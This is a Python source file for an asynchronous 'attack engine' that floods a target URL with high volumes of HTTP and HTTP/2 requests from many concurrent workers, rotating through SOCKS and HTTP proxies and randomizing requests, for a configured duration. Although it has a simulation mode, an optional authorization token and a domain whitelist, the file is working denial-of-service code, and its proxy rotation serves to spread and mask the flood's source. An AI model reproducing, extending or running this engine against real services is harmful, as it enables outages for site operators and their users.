"""Main attack engine with async implementation and HTTP/2 support."""

import asyncio
import time
import uuid
from datetime import datetime
from typing import Optional, Callable
from collections import deque

import aiohttp
import httpx
from aiohttp_socks import ProxyConnector, ProxyType as SocksProxyType

from src.models import AttackConfig, AttackMode, AttackStats, ProxyType, RequestResult
from src.proxy_manager import ProxyManager
from src.request_builder import RequestBuilder
from src.logger import logger

MAX_RESPONSE_SIZE = 10 * 1024 * 1024
STATS_UPDATE_BATCH = 100


class AttackEngine:
    """High-performance attack engine using asyncio."""

    def __init__(self, config: AttackConfig, proxy_manager: Optional[ProxyManager] = None):
        self.config = config
        self.proxy_manager = proxy_manager
        self.session_id = str(uuid.uuid4())

        self.stats = AttackStats(
            session_id=self.session_id,
            target_url=config.target_url,
            mode=config.mode,
            start_time=datetime.now(),
        )

        self.request_builder = RequestBuilder(
            target_url=config.target_url,
            mode=config.mode,
            custom_headers=config.custom_headers,
            cookies=config.cookies,
            post_data=config.post_data,
        )

        self._running = False
        self._stop_event = asyncio.Event()
        self._stats_lock = asyncio.Lock()
        self._pending_results = deque(maxlen=STATS_UPDATE_BATCH * 2)

        self.on_request_complete: Optional[Callable[[RequestResult], None]] = None
        self.on_stats_update: Optional[Callable[[AttackStats], None]] = None

        logger.info(
            "attack_engine_initialized",
            session_id=self.session_id,
            target=config.target_url,
            mode=config.mode.value,
            simulation=config.simulation_mode,
        )

    async def start(self) -> AttackStats:
        if self._running:
            raise RuntimeError("Attack already running")

        self._validate_config()

        if self.config.simulation_mode:
            logger.warning("SIMULATION_MODE_ACTIVE - No real requests will be sent")
            return await self._run_simulation()

        self._running = True
        self.stats.start_time = datetime.now()

        logger.info(
            "attack_starting",
            target=self.config.target_url,
            threads=self.config.threads,
            duration=self.config.duration,
        )

        try:
            stats_task = asyncio.create_task(self._batch_stats_updater())

            if self.config.use_http2:
                await self._run_http2_attack()
            else:
                await self._run_aiohttp_attack()

            stats_task.cancel()
            await self._flush_pending_stats()

        except Exception as e:
            logger.error("attack_failed", error=str(e), exc_info=True)
            raise
        finally:
            self._running = False
            self.stats.end_time = datetime.now()
            self.stats.calculate_metrics()

            if self.proxy_manager:
                proxy_stats = self.proxy_manager.get_stats()
                self.stats.total_proxies = proxy_stats["total"]
                self.stats.active_proxies = proxy_stats["active"]
                self.stats.failed_proxies = proxy_stats["dead"]

        logger.info(
            "attack_completed",
            session_id=self.session_id,
            total_requests=self.stats.total_requests,
            success_rate=f"{self.stats.success_rate:.2f}%",
            rps=f"{self.stats.requests_per_second:.2f}",
        )

        return self.stats

    def _validate_config(self) -> None:
        if self.config.require_authorization and not self.config.authorization_token:
            raise ValueError("Authorization token required but not provided")

        if self.config.whitelist:
            from urllib.parse import urlparse
            target_domain = urlparse(self.config.target_url).netloc
            if not any(domain in target_domain for domain in self.config.whitelist):
                raise ValueError(
                    f"Target {target_domain} not in whitelist: {self.config.whitelist}"
                )

    async def _run_simulation(self) -> AttackStats:
        logger.info("running_simulation", duration=self.config.duration)

        start_time = time.time()
        simulated_rps = 100

        while time.time() - start_time < self.config.duration:
            await asyncio.sleep(0.1)
            elapsed = time.time() - start_time
            self.stats.total_requests = int(elapsed * simulated_rps)
            self.stats.successful_requests = int(self.stats.total_requests * 0.95)
            self.stats.failed_requests = self.stats.total_requests - self.stats.successful_requests

            if self.on_stats_update:
                self.on_stats_update(self.stats)

        self.stats.end_time = datetime.now()
        self.stats.calculate_metrics()

        logger.info("simulation_complete", total_requests=self.stats.total_requests)
        return self.stats

    async def _batch_stats_updater(self) -> None:
        """Background task to batch update stats."""
        while self._running or len(self._pending_results) > 0:
            await asyncio.sleep(0.1)
            if len(self._pending_results) >= STATS_UPDATE_BATCH:
                await self._flush_pending_stats()

    async def _flush_pending_stats(self) -> None:
        """Flush all pending results to stats."""
        if not self._pending_results:
            return

        async with self._stats_lock:
            while self._pending_results:
                result = self._pending_results.popleft()
                self._update_stats_internal(result)

            if self.on_stats_update:
                self.on_stats_update(self.stats)

    async def _run_aiohttp_attack(self) -> None:
        semaphore = asyncio.Semaphore(self.config.threads)
        tasks = []

        for worker_id in range(self.config.threads):
            task = asyncio.create_task(self._aiohttp_worker(worker_id, semaphore))
            tasks.append(task)

        asyncio.create_task(self._schedule_stop(self.config.duration))
        await asyncio.gather(*tasks, return_exceptions=True)

    async def _aiohttp_worker(self, worker_id: int, semaphore: asyncio.Semaphore) -> None:
        while not self._stop_event.is_set():
            async with semaphore:
                proxy = None
                connector = None

                if self.proxy_manager:
                    proxy = self.proxy_manager.get_random_proxy()
                    if proxy:
                        proxy_type_map = {
                            ProxyType.SOCKS4: SocksProxyType.SOCKS4,
                            ProxyType.SOCKS5: SocksProxyType.SOCKS5,
                            ProxyType.HTTP: SocksProxyType.HTTP,
                        }

                        connector = ProxyConnector(
                            proxy_type=proxy_type_map[proxy.proxy_type],
                            host=proxy.host,
                            port=proxy.port,
                            username=proxy.username,
                            password=proxy.password,
                        )

                try:
                    async with aiohttp.ClientSession(connector=connector) as session:
                        for _ in range(self.config.requests_per_connection):
                            if self._stop_event.is_set():
                                break

                            result = await self._send_aiohttp_request(
                                session, proxy.address if proxy else None
                            )

                            self._pending_results.append(result)

                            if self.on_request_complete:
                                self.on_request_complete(result)

                            if not result.success and proxy:
                                self.proxy_manager.mark_dead(proxy)
                                break

                except Exception as e:
                    logger.debug("worker_error", worker_id=worker_id, error=str(e))
                    if proxy and self.proxy_manager:
                        self.proxy_manager.mark_dead(proxy)

    async def _send_aiohttp_request(
        self, session: aiohttp.ClientSession, proxy_address: Optional[str]
    ) -> RequestResult:
        start_time = time.time()

        try:
            kwargs = self.request_builder.build_request_kwargs(randomize=True)
            method = self.request_builder.get_method()
            url = kwargs.pop("url")
            timeout = aiohttp.ClientTimeout(total=kwargs.pop("timeout", 10))

            async with session.request(method, url, timeout=timeout, **kwargs) as response:
                response_time = time.time() - start_time
                await response.content.read(MAX_RESPONSE_SIZE)

                return RequestResult(
                    success=True,
                    status_code=response.status,
                    response_time=response_time,
                    proxy_used=proxy_address,
                )

        except asyncio.TimeoutError:
            return RequestResult(
                success=False,
                response_time=time.time() - start_time,
                error="Timeout",
                proxy_used=proxy_address,
            )
        except Exception as e:
            return RequestResult(
                success=False,
                response_time=time.time() - start_time,
                error=str(e),
                proxy_used=proxy_address,
            )

    async def _run_http2_attack(self) -> None:
        semaphore = asyncio.Semaphore(self.config.threads)
        tasks = []

        for worker_id in range(self.config.threads):
            task = asyncio.create_task(self._http2_worker(worker_id, semaphore))
            tasks.append(task)

        asyncio.create_task(self._schedule_stop(self.config.duration))
        await asyncio.gather(*tasks, return_exceptions=True)

    async def _http2_worker(self, worker_id: int, semaphore: asyncio.Semaphore) -> None:
        while not self._stop_event.is_set():
            async with semaphore:
                proxy_url = None
                proxy = None

                if self.proxy_manager:
                    proxy = self.proxy_manager.get_random_proxy()
                    if proxy:
                        proxy_url = proxy.url

                try:
                    async with httpx.AsyncClient(
                        http2=True,
                        proxy=proxy_url,
                        verify=self.config.verify_ssl,
                        timeout=self.config.timeout,
                    ) as client:
                        for _ in range(self.config.requests_per_connection):
                            if self._stop_event.is_set():
                                break

                            result = await self._send_http2_request(client, proxy_url)
                            self._pending_results.append(result)

                            if self.on_request_complete:
                                self.on_request_complete(result)

                            if not result.success and proxy:
                                self.proxy_manager.mark_dead(proxy)
                                break

                except Exception as e:
                    logger.debug("http2_worker_error", worker_id=worker_id, error=str(e))
                    if proxy and self.proxy_manager:
                        self.proxy_manager.mark_dead(proxy)

    async def _send_http2_request(
        self, client: httpx.AsyncClient, proxy_url: Optional[str]
    ) -> RequestResult:
        start_time = time.time()

        try:
            kwargs = self.request_builder.build_request_kwargs(randomize=True)
            method = self.request_builder.get_method()
            url = kwargs.pop("url")
            kwargs.pop("timeout", None)
            kwargs.pop("allow_redirects", None)

            response = await client.request(method, url, follow_redirects=False, **kwargs)
            response_time = time.time() - start_time

            return RequestResult(
                success=True,
                status_code=response.status_code,
                response_time=response_time,
                proxy_used=proxy_url,
            )

        except httpx.TimeoutException:
            return RequestResult(
                success=False,
                response_time=time.time() - start_time,
                error="Timeout",
                proxy_used=proxy_url,
            )
        except Exception as e:
            return RequestResult(
                success=False,
                response_time=time.time() - start_time,
                error=str(e),
                proxy_used=proxy_url,
            )

    def _update_stats_internal(self, result: RequestResult) -> None:
        """Internal stats update without lock (must be called within lock)."""
        self.stats.total_requests += 1

        if result.success:
            self.stats.successful_requests += 1
            if result.status_code:
                self.stats.status_codes[result.status_code] = (
                    self.stats.status_codes.get(result.status_code, 0) + 1
                )
        else:
            self.stats.failed_requests += 1

        if result.response_time > 0:
            if self.stats.min_response_time == 0:
                self.stats.min_response_time = result.response_time
            else:
                self.stats.min_response_time = min(
                    self.stats.min_response_time, result.response_time
                )

            self.stats.max_response_time = max(
                self.stats.max_response_time, result.response_time
            )

            total_time = self.stats.avg_response_time * (self.stats.total_requests - 1)
            self.stats.avg_response_time = (
                total_time + result.response_time
            ) / self.stats.total_requests

    async def _schedule_stop(self, duration: int) -> None:
        await asyncio.sleep(duration)
        logger.info("duration_reached_stopping", duration=duration)
        self._stop_event.set()

    async def stop(self) -> None:
        logger.info("stopping_attack", session_id=self.session_id)
        self._stop_event.set()
        await asyncio.sleep(0.1)

    def get_stats(self) -> AttackStats:
        return self.stats
